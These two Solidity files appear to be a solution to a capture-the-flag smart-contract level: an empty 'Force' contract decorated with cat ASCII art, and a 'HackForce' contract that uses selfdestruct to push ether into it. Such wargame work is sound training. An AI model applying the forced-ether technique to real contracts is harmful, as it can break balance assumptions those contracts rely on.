// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import '../contracts/Force.sol';

contract HackForce {
    mapping(address => uint256) allocations;

    constructor() payable {}

    function selfDestruct(address payable instanceAddress) public {
        selfdestruct(instanceAddress);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

contract Force { /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/ }